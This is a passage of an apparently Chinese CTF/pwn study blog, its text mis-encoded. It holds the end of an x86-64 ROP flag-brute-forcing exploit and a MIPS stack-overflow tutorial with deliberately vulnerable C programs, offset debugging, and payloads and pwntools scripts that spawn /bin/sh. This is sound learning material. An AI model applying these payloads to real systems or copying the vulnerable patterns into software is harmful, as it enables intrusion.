class="line">pop_rax=<span class="number">0x0000000000401001</span></span><br><span class="line">pop_rdi_rbp=<span class="number">0x0000000000401734</span></span><br><span class="line">pop_rsi_r15_rbp=<span class="number">0x0000000000401732</span></span><br><span class="line">pop_rbp=<span class="number">0x0000000000401102</span></span><br><span class="line">sys_read=<span class="number">0x40119A</span></span><br><span class="line">pop_r12_r14_r15_rbp=<span class="number">0x000000000040172f</span></span><br><span class="line">mov_rsi_rdx_call_r14=<span class="number">0x0000000000402c04</span></span><br><span class="line">pop_rsp_mov_edi=<span class="number">0x0000000000409d1c</span></span><br><span class="line">ret=<span class="number">0x0000000000401002</span></span><br><span class="line">pop_rax=<span class="number">0x0000000000401001</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>(<span class="params">num,ans</span>):</span></span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">str</span>(num)+<span class="string">&quot;==&gt;&quot;</span>+<span class="built_in">chr</span>(ans)</span><br><span class="line">    sh=process(<span class="string">&#x27;./gadget&#x27;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(sh,&quot;b *0x408F72&quot;)</span></span><br><span class="line">    <span class="comment">#part1 stack&amp;read</span></span><br><span class="line">    payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>+p64(pop_rax)+p64(<span class="number">0</span>)+p64(pop_rdi_rbp)+p64(<span class="number">0</span>)+p64(bss_base)</span><br><span class="line">    payload+=p64(pop_r12_r14_r15_rbp)+p64(<span class="number">0x300</span>)+p64(sys_read)+p64(bss_base)+p64(bss_base)</span><br><span class="line">    payload+=p64(mov_rsi_rdx_call_r14)+p64(pop_rsp_mov_edi)+p64(bss_base+<span class="number">0x8</span>)</span><br><span class="line">    sh.send(payload.ljust(<span class="number">0xc0</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="comment">#part2 retf&amp;open&amp;read</span></span><br><span class="line">    payload=<span class="string">&#x27;./flag\x00\x00&#x27;</span>+p64(retfq)+p64(ret)+p64(<span class="number">0x23</span>)</span><br><span class="line">    payload+=p32(pop_rax)+p32(<span class="number">5</span>)+p32(pop_rbx_r14_r15_rbp)+p32(bss_base)*<span class="number">4</span></span><br><span class="line">    payload+=p32(pop_rcx)+p32(<span class="number">0</span>)+p32(int80_ret)+p32(retfq)+p32(ret)</span><br><span class="line">    payload+=p32(<span class="number">0x33</span>)+p64(pop_rax)+p64(<span class="number">0</span>)+p64(pop_rdi_rbp)+p64(<span class="number">3</span>)+p64(bss_base)</span><br><span class="line">    payload+=p64(sys_ret)+p64(pop_rdi_rbp)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(pop_rsi_r15_rbp)</span><br><span class="line">    payload+=p64(bss_base+<span class="number">1</span>+num)*<span class="number">2</span>+p64(bss_base+<span class="number">8</span>+num)+p64(pop_rax)+p64(<span class="number">0</span>)+p64(sys_ret)+p64(pop_rsp_mov_edi)+p64(bss_base+<span class="number">8</span>+num)</span><br><span class="line">    payload=payload.ljust(<span class="number">0x300</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    <span class="comment">#part3 alarm</span></span><br><span class="line">    payload=<span class="string">&#x27;\x00\x00\x00\x00\x00\x00\x00&#x27;</span>+p64(pop_rsi_r15_rbp)+p64(<span class="number">0</span>)+p64(bss_base-<span class="number">0x38</span>+num)*<span class="number">2</span></span><br><span class="line">    payload+=p64(pop_rax)+p64(ans)+p64(<span class="number">0x408F72</span>)</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sh.recv(timeout=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">global</span> flag</span><br><span class="line">        flag+=<span class="built_in">chr</span>(ans)</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;flag:&quot;</span>+flag</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x22</span>,<span class="number">0x7f</span>):</span><br><span class="line">            s=pwn(i,m)</span><br><span class="line">            <span class="keyword">if</span> s==<span class="number">1</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/17/mips%E5%88%9D%E4%BD%93%E9%AA%8C/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="æˆ‘çš„åšå®¢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/01/17/mips%E5%88%9D%E4%BD%93%E9%AA%8C/" class="post-title-link" itemprop="url">mipsåˆä½“éªŒ</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2022-01-17 16:07:28 / ä¿®æ”¹æ—¶é—´ï¼š16:08:11" itemprop="dateCreated datePublished" datetime="2022-01-17T16:07:28+08:00">2022-01-17</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="mipsæ ˆæº¢å‡º"><a href="#mipsæ ˆæº¢å‡º" class="headerlink" title="mipsæ ˆæº¢å‡º"></a>mipsæ ˆæº¢å‡º</h1><p>mipså‡½æ•°è°ƒç”¨ï¼šx86å‡½æ•°è°ƒç”¨æ—¶éƒ½æ˜¯æŠŠèŒƒæ¹–åœ°å€æ”¾åœ¨æ ˆå†…ï¼Œå‡½æ•°æ‰§è¡Œå®Œå†é€šè¿‡è¿”å›åœ°å€æ‰§è¡Œä¸‹ä¸€æ¡æŒ‡ä»¤ï¼Œmipsçš„å‡½æ•°è°ƒç”¨å’Œx86æœ‰äº›åƒåˆæœ‰äº›ä¸åƒï¼Œåœ¨mipsç¨‹åºä¸­ï¼Œå‡½æ•°åˆ†ä¸ºå¶å­å‡½æ•°å’Œéå¶å­å‡½æ•°ï¼Œå¯¹åº”æ•°æ®ç»“æ„ä¸­çš„æ ‘ï¼Œå¶å­å‡½æ•°æŒ‡ä¸åœ¨è°ƒç”¨å‡½æ•°çš„å‡½æ•°ï¼Œéå¶å­å‡½æ•°æŒ‡å‡½æ•°å†…éƒ¨åˆè°ƒç”¨äº†å…¶ä»–å‡½æ•°çš„å‡½æ•°ï¼Œä¸¤ç§å‡½æ•°å¯¹è¿”å›å€¼çš„å¤„ç†æ˜¯ä¸ä¸€æ ·çš„ï¼Œå½“è°ƒç”¨å¶å­å‡½æ•°æ—¶ï¼Œä¼šç›´æ¥æŠŠè¿”å›åœ°å€å‚¨å­˜åœ¨$raå¯„å­˜å™¨ä¸­ï¼Œè°ƒç”¨éå¶å­å‡½æ•°æ—¶ï¼Œ$raå‚¨å­˜ç€å‡½æ•°çš„è¿”å›åœ°å€ï¼Œåœ¨å‡½æ•°åˆå§‹éƒ¨åˆ†ä¼šç›´æ¥æŠŠ$raçš„åœ°å€å…¥æ ˆï¼Œå½“æ‰§è¡Œå®Œè¿™ä¸ªå‡½æ•°æ—¶å†æ‰¾åˆ°åœ°å€è¿”å›å¯¹åº”æŒ‡ä»¤ã€‚</p>
<h2 id="ä¸¾ä¾‹ä¸€"><a href="#ä¸¾ä¾‹ä¸€" class="headerlink" title="ä¸¾ä¾‹ä¸€"></a>ä¸¾ä¾‹ä¸€</h2><p>æºä»£ç </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">backdoor</span><span class="params">()</span></span>&#123;</span><br><span class="line">system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">has_stack</span><span class="params">(<span class="keyword">char</span> *src)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> dst[<span class="number">20</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="built_in">strcpy</span>(dst,src);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;copy successfully&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">has_stack(argv[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å…ˆè¿›è¡Œç¼–è¯‘</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">mipsel-linux-gcc vuln -static(æŒ‡é™æ€ç»‘å®šï¼Œä¸ä½¿ç”¨å…±äº«åº“)</span></span><br></pre></td></tr></table></figure>

<p>fileæŸ¥çœ‹ä¸€ä¸‹</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rootzhang@rootzhang-virtual-machine:~/mipsshell$ file vuln</span><br><span class="line">vuln: ELF 32-bit LSB executable, MIPS, MIPS32 version 1 (SYSV), statically linked, not stripped</span><br></pre></td></tr></table></figure>

<p>å¯è§æˆåŠŸç¼–è¯‘</p>
<p>ç„¶åæ‹–å…¥idaæŸ¥çœ‹ä»–çš„æ±‡ç¼–ä»£ç </p>
<p>main</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.text:00400490                 addiu   $sp, -0x20</span><br><span class="line">.text:00400494                 sw      $ra, 0x20+var_4($sp)</span><br><span class="line">.text:00400498                 sw      $fp, 0x20+var_8($sp)</span><br><span class="line">.text:0040049C                 move    $fp, $sp</span><br><span class="line">.text:004004A0                 sw      $a0, 0x20+arg_0($fp)</span><br><span class="line">.text:004004A4                 sw      $a1, 0x20+arg_4($fp)</span><br><span class="line">.text:004004A8                 lw      $v0, 0x20+arg_4($fp)</span><br><span class="line">.text:004004AC                 addiu   $v0, 4</span><br><span class="line">.text:004004B0                 lw      $v0, 0($v0)</span><br><span class="line">.text:004004B4                 move    $a0, $v0</span><br><span class="line">.text:004004B8                 jal     has_stack</span><br><span class="line">.text:004004BC                 nop</span><br><span class="line">.text:004004C0                 nop</span><br><span class="line">.text:004004C4                 move    $sp, $fp</span><br><span class="line">.text:004004C8                 lw      $ra, 0x20+var_4($sp)</span><br><span class="line">.text:004004CC                 lw      $fp, 0x20+var_8($sp)</span><br><span class="line">.text:004004D0                 addiu   $sp, 0x20</span><br><span class="line">.text:004004D4                 jr      $ra</span><br><span class="line">.text:004004D8                 nop</span><br></pre></td></tr></table></figure>

<p>åˆšè¿›å…¥mainå‡½æ•°å°±å¯¹$spè¿›è¡Œäº†æ“ä½œï¼Œè¿™ä¸ª$spå¯¹åº”x86çš„rspï¼Œå‚¨å­˜ç€æ ˆåº•çš„åœ°å€ï¼Œç¬¬ä¸€æ¡æŒ‡ä»¤çš„æ“ä½œå°±æ˜¯å¼€è¾Ÿmainå‡½æ•°çš„æ ˆå¸§ï¼Œç”±äºmainæ˜¯éå¶å­å‡½æ•°æ‰€ä»¥å¾—æŠŠ$raå‹å…¥æ ˆï¼Œç¬¬äºŒæ¡æŒ‡ä»¤å°±æ˜¯æ‰§è¡Œè¿™ä¸ªæ“ä½œï¼Œå½“mainå‡½æ•°æŒ‡ä»¤å®Œä¸»è¦éƒ¨åˆ†åå°±ä¼šæ‰§è¡Œ<code>lw      $ra, 0x20+var_4($sp)</code>æŒ‡ä»¤ï¼Œè¿™ä¸ªæŒ‡ä»¤å°±æ˜¯æŠŠè¿”å›åœ°å€å­˜å…¥$raä¸­ï¼Œæœ€å<code>jr      $ra</code>è¿›è¡Œè·³è½¬ã€‚</p>
<h2 id="ç¨‹åºåˆ†æ"><a href="#ç¨‹åºåˆ†æ" class="headerlink" title="ç¨‹åºåˆ†æ"></a>ç¨‹åºåˆ†æ</h2><p>ç¨‹åºä¸­å¯¹è¾“å…¥å€¼æ²¡æœ‰é™åˆ¶å°±ç›´æ¥æ”¾å…¥has_stackå‡½æ•°çš„æ ˆä¸­ï¼Œè€Œhas_stackå‡½æ•°åˆæ˜¯éå¶å­å‡½æ•°ï¼Œæ ˆä¸­å‚¨å­˜ç€è¿”å›åœ°å€ï¼Œåªè¦ç¡®å®šè¾“å…¥çš„åœ°å€å’Œå‚¨å­˜è¿”å›åœ°å€çš„åœ°å€çš„å·®å€¼å°±å¯ä»¥å¯¹è¿”å›åœ°å€è¿›è¡Œå‡†ç¡®è¦†ç›–äº†ï¼Œå¯ä»¥ç›´æ¥é€šè¿‡idaç¡®å®šï¼Œä¹Ÿå¯ä»¥è®©ç¨‹åºè·‘èµ·æ¥å†ç¡®å®š</p>
<h2 id="å°è¯•æ”»å‡»ï¼ˆç¡®å®šå¡«å……é‡ï¼‰"><a href="#å°è¯•æ”»å‡»ï¼ˆç¡®å®šå¡«å……é‡ï¼‰" class="headerlink" title="å°è¯•æ”»å‡»ï¼ˆç¡®å®šå¡«å……é‡ï¼‰"></a>å°è¯•æ”»å‡»ï¼ˆç¡®å®šå¡«å……é‡ï¼‰</h2><p>è¿è¡ŒåŠ è°ƒè¯•</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">qemu-misepl -g 1234 ./vuln <span class="string">&quot;aaaaa&quot;</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">gdb-multiarch ./vuln</span></span><br><span class="line"><span class="meta">#</span><span class="bash">target remote:1234</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç¨‹åºå°±å¼€å§‹è¿è¡Œå¹¶è°ƒè¯•èµ·æ¥äº†</p>
<p>è°ƒè¯•æ•ˆæœ</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">08:0020â”‚    0x76ffef60 â—‚â€” &#x27;aaaaaaaa&#x27;</span><br><span class="line">09:0024â”‚    0x76ffef64 â—‚â€” &#x27;aaaa&#x27;</span><br><span class="line">0a:0028â”‚ v1 0x76ffef68 â—‚â€” 0</span><br><span class="line">0b:002câ”‚    0x76ffef6c â—‚â€” 0</span><br><span class="line">0c:0030â”‚    0x76ffef70 â€”â–¸ 0x76ffef78 â€”â–¸ 0x76fff283 â—‚â€” &#x27;aaaaaaaaaaaaaaaa&#x27;</span><br><span class="line">0d:0034â”‚    0x76ffef74 â€”â–¸ 0x4004c0 (main+48) â—‚â€” 0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å¯è§bufå’Œraä¹‹é—´å·®28ä¸ªå­—èŠ‚</p>
<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">qemu-mipsel vuln `python -c &quot;print &#x27;a&#x27;*28+&#x27;\xb4\x03\x40\x00&#x27;&quot;`</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">æ‹¿åˆ°shell</span><br><span class="line">rootzhang@rootzhang-virtual-machine:~/mipsshell/stady$ qemu-mipsel vuln `python -c &quot;print &#x27;a&#x27;*28+&#x27;\xb4\x03\x40\x00&#x27;&quot;`</span><br><span class="line"><span class="meta">$</span><span class="bash"> ls</span></span><br><span class="line">core  pwnc.py  vuln  vuln.id0  vuln.id1  vuln.nam  vuln.til</span><br><span class="line"><span class="meta">$</span><span class="bash"> </span></span><br></pre></td></tr></table></figure>

<h2 id="ä¸¾ä¾‹äºŒ"><a href="#ä¸¾ä¾‹äºŒ" class="headerlink" title="ä¸¾ä¾‹äºŒ"></a>ä¸¾ä¾‹äºŒ</h2><p>æºç </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_system</span><span class="params">(<span class="keyword">int</span> code,<span class="keyword">char</span> *cmd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">255</span>];</span><br><span class="line">system(cmd);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">256</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> ch;</span><br><span class="line"><span class="keyword">int</span> count=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> filelen=<span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">fileData</span>;</span></span><br><span class="line">FILE *fp;</span><br><span class="line"><span class="keyword">if</span>(<span class="number">0</span>==stat(<span class="string">&quot;passwd&quot;</span>,&amp;fileData))</span><br><span class="line">&#123;</span><br><span class="line">filelen=fileData.st_size;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>((fp=fopen(<span class="string">&quot;passwd&quot;</span>,<span class="string">&quot;rb&quot;</span>))==<span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;cannot open file passwd!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">ch=fgetc(fp);</span><br><span class="line"><span class="keyword">while</span>(count&lt;=filelen)</span><br><span class="line">&#123;</span><br><span class="line">buf[count++]=ch;</span><br><span class="line">ch=fgetc(fp);</span><br><span class="line">&#125;</span><br><span class="line">buf[--count]=<span class="string">&#x27;\x00&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(buf,<span class="string">&quot;adminpwd&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line">do_system(count,<span class="string">&quot;ls -l&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;you have an invalid password!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">fclose(fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ç¨‹åºåˆ†æ-1"><a href="#ç¨‹åºåˆ†æ-1" class="headerlink" title="ç¨‹åºåˆ†æ"></a>ç¨‹åºåˆ†æ</h3><p>ä¼šæ‰“å¼€æœ¬åœ°çš„passwdæ–‡ä»¶ï¼Œä¸å¯¹æ–‡ä»¶å†…å®¹åšé™åˆ¶ç›´æ¥æ”¾è¿›bufä¸­ï¼Œè€Œmainåˆæ˜¯éå¶å­å‡½æ•°ï¼Œè¿”å›åœ°å€ä¿å­˜åœ¨æ ˆä¸­ï¼Œå¯ä»¥ç›´æ¥è¦†ç›–è¿”å›åœ°å€ä¸ºåé—¨å‡½æ•°çš„åœ°å€ï¼Œä½†æ˜¯åé—¨å‡½æ•°é‡Œsystemçš„å‚æ•°ä¸æ˜¯å›ºå®šçš„ï¼Œæ˜¯åé—¨å‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°ï¼Œç¬¬äºŒä¸ªå‚æ•°çš„ç”¨å¯„å­˜å™¨$a1å‚¨å­˜ï¼Œæ‰€ä»¥å¾—åœ¨è°ƒç”¨å‰å¯¹$a1èµ‹å€¼æ‰è¡Œï¼Œåœ¨x86é‡Œé¢éƒ½æ˜¯ç”¨gadgetå®Œæˆå‚æ•°æ„é€ ï¼Œåœ¨mipsé‡Œé¢ä¹Ÿæ˜¯ï¼Œä¸è¿‡è¿™æ¬¡æ˜¯ç”¨idaæŸ¥æ‰¾gadget</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">Python&gt;</span><span class="bash">mipsrop.stackfinder()----------------------------------------------------------------------------------------------------------------|  Address     |  Action                                              |  Control Jump                          |----------------------------------------------------------------------------------------------------------------|  0x00401F90  |  addiu <span class="variable">$a1</span>,<span class="variable">$sp</span>,0x58+var_40                           |  jr    0x58+var_4(<span class="variable">$sp</span>)                 |----------------------------------------------------------------------------------------------------------------</span></span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªgadgetçš„åœ°å€æ˜¯0x00401F90,é€šè¿‡å…¶æ±‡ç¼–å¯çŸ¥å¯ä»¥é€šè¿‡æ ˆæ¥å¯¹$a1è¿›è¡Œèµ‹å€¼ï¼Œç„¶åå† jr    0x58+var_4($sp) ï¼Œæ‰€ä»¥åªè¦åœ¨å¯¹åº”ä½ç½®å¡«å……å¯¹åº”å€¼å°±è¡Œäº†ã€‚</p>
<h2 id="æ”»å‡»"><a href="#æ”»å‡»" class="headerlink" title="æ”»å‡»"></a>æ”»å‡»</h2><p>æœ¬æ¥æ‰“ç®—æŠŠè¿™ä¸ªæ‹–è¿›idaç›´æ¥çœ‹åç§»é‡çš„ï¼Œç»“æœå‘ç°ä»–åæ±‡ç¼–å‡ºæ¥çš„ä»£ç å’Œæºä»£ç ä¹Ÿç›¸å·®å¤ªå¤§äº†ï¼Œäºæ˜¯æ”¾å¼ƒidaç›´æ¥é€šè¿‡è¿è¡Œç¡®å®šåç§»é‡ã€‚</p>
<p>æ‰¾åˆ°bufåœ°å€</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> 08:0020â”‚  0x76ffedf8 â—‚â€” 0x3c /* <span class="string">&#x27;&lt;&#x27;</span> */09:0024â”‚  0x76ffedfc â€”â–¸ 0x425908 â—‚â€” move   <span class="variable">$t4</span>, <span class="variable">$zero</span> /* 0x6025; <span class="string">&#x27;%`&#x27;</span> */... â†“     2 skipped0c:0030â”‚  0x76ffee08 â—‚â€” 0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)... â†“     3 skippedpwndbg&gt; 10:0040â”‚  0x76ffee18 â—‚â€” 0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span></span><br></pre></td></tr></table></figure>

<p>å‚¨å­˜è¿”å›åœ°å€çš„åœ°å€æ˜¯0x76ffedd8+0x1ccï¼Œç®—å‡º</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">offest=0x76ffedd8+0x1cc-0x76ffee08=0x19c</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥å¾—åˆ°payload</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=&#x27;a&#x27;*0x19c+p32(gadget_addr)+&#x27;a&#x27;*0x18+&#x27;/bin/sh\x00&#x27;payload=payload.ljust(0x1a0+0x54,&#x27;a&#x27;)payload=payload+p32(dock_addr)</span><br></pre></td></tr></table></figure>

<p>æœ€ç»ˆè„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *gadget_addr=0x00401F90dock_addr=<span class="number">0x004003B0f</span>=<span class="built_in">open</span>(<span class="string">&quot;passwd&quot;</span>,<span class="string">&quot;wb&quot;</span>)payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x19c</span>+p32(gadget_addr)+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">&#x27;/bin/sh\x00&#x27;</span>payload=payload.ljust(<span class="number">0x1a0</span>+<span class="number">0x54</span>,<span class="string">&#x27;a&#x27;</span>)payload=payload+p32(dock_addr)f.write(payload)f.close()</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°shell</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rootzhang@rootzhang-virtual-machine:~/mipsshell/stady1$ qemu-mipsel ./vulnyou have an invalid password!$ lscore  passwd  pwnc.py  vuln  vuln.c  vuln.id0  vuln.id1  vuln.nam  vuln.til</span><br></pre></td></tr></table></figure>

<p>æ€»ç»“ï¼šgdb-multiarchè°ƒè¯•çš„æ—¶å€™å¥½åƒä¸èƒ½b+å‡½æ•°åï¼Œä¸ç„¶æŠ“ä¸åˆ°ï¼Œå¾—ç¡®åˆ‡çš„åœ°å€æ‰å¯ä»¥ã€‚</p>
<h2 id="ä¸¾ä¾‹ä¸‰-HWX-mipspwnå…¥é—¨é¢˜"><a href="#ä¸¾ä¾‹ä¸‰-HWX-mipspwnå…¥é—¨é¢˜" class="headerlink" title="ä¸¾ä¾‹ä¸‰ HWX mipspwnå…¥é—¨é¢˜"></a>ä¸¾ä¾‹ä¸‰ HWX mipspwnå…¥é—¨é¢˜</h2><p>çŸ¥è¯†è¡¥å……ï¼šmipsä¸€èˆ¬éƒ½æ˜¯å †æ ˆå¯æ‰§è¡Œçš„ï¼Œæ‰€ä»¥åªè¦å‘å †æ ˆä¸­æ”¾å…¥shellcodeï¼Œç„¶ååˆ©ç”¨è¿”å›åœ°å€è·³åˆ°shellcodeå°±è¡Œäº†ï¼ˆæ³„éœ²æ ˆåœ°å€ï¼‰ï¼Œ</p>
<p>æºç </p>
